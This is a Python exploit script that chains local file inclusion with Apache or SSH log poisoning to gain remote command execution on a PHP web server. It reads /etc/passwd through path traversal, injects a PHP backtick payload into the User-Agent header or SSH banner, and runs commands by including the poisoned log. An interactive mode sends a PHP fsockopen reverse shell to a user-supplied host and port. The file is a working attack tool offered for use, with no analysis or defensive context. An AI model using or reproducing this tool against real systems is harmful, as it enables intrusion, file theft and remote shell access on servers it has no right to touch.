#!/usr/bin/env python3
import requests
import socket
import argparse

def local_file_inclusion(url, param="page"):
    file_to_read="../../../../../../../../../../../../etc/passwd"
    payload = {
        param: file_to_read
            }

    response = requests.get(url, params=payload)
    text = response.text
    print(text)
    if "root:x:0:0:" in text:
        print("[+] File inclusion confirmed...")
        return True
    
    else:
        print("[-] File inclusion not found...")
        return False

def apache_log_poisoning(url):
    headers = {
        "User-Agent": "<?=`$_GET[0]`?>"
            }
    response = requests.get(url, headers=headers)
    print(response.status_code)
    if response.status_code == 200:
        print("[+] Apache log poisoned...")
        return True
    else:
        print(f"[-] An error has occurred. Status code: {response.status_code}...")
        return False

def ssh_log_poisoning(ip, port=22):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    print(f"[+] Connecting to {ip}:{port}")
    sock.connect((ip,port))
    print(f"[+] Connected to host...")
    banner = sock.recv(1024)
    print(banner)
    payload = "<?=`$_GET[0]`?>"
    poison = f"SSH-2.0-{payload}\n".encode("utf-8")
    print(f"[+] Sending {poison}...")
    sock.send(poison)
    print("[+] SSH log poisoned...")
    sock.close()

def exploit(url, param, method="apache", cmd="id", file_to_read="../../../../../../../../../../../../var/log/apache2/access.log"): # Change this if your filename is different
    payload = {
            param: file_to_read,
            "0": cmd
            }

    response = requests.get(url, params=payload)
    text = response.text
    print(text)

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("url", help="The vulnerable URL")
    parser.add_argument("method", default="apache", help="Apache or SSH log poisoning")
    parser.add_argument("--parameter", default="page", help="The vulnerable parameter")
    parser.add_argument("--ip", help="Target IP address, only for SSH log poisoning")
    parser.add_argument("--port", default=22, help="The target SSH port, only for SSH log poisoning")
    parser.add_argument("--cmd", default="id", help="The command you want to execute")
    parser.add_argument("--filename", default="../../../../../../../../../../var/log/apache2/access.log", help="The file you want to read")
    parser.add_argument("--interactive-shell", action="store_true", help="Spawn an interactive shell with log poisoning")
    args = parser.parse_args()

    if local_file_inclusion(args.url, args.parameter):
        if args.method.lower() == "apache":
            if apache_log_poisoning(args.url):
                exploit(
                    args.url,
                    args.parameter,
                    method=args.method,
                    cmd=args.cmd,
                    file_to_read=args.filename
                )
        elif args.method.lower() == "ssh":
            ssh_log_poisoning(args.ip)
            exploit(
                args.url,
                args.parameter,
                method=args.method,
                cmd=args.cmd,
                file_to_read=args.filename
            )

        if args.interactive_shell:
            if args.method == "apache":
                apache_log_poisoning(args.url)
            elif args.method == "ssh":
                ssh_log_poisoning(args.ip, args.port)

            while True:
                cmd = input(">>> ")
                if cmd == "exit":
                    break
                elif cmd == "shell":
                    lhost = input("Enter your IP address: ")
                    lport = input("Enter the port you're listening on: ")
                    cmd = f"""php -r '$sock=fsockopen("{lhost}",{lport});system("/bin/sh <&3 >&3 2>&3");'""" # Change this if you have to
                    exploit(
                        args.url,
                        args.parameter,
                        method=args.method,
                        cmd=cmd,
                        file_to_read=args.filename
                    )
                else:
                    exploit(
                        args.url,
                        args.parameter,
                        method=args.method,
                        cmd=cmd,
                        file_to_read=args.filename
                    )


if __name__ == "__main__":
    main()
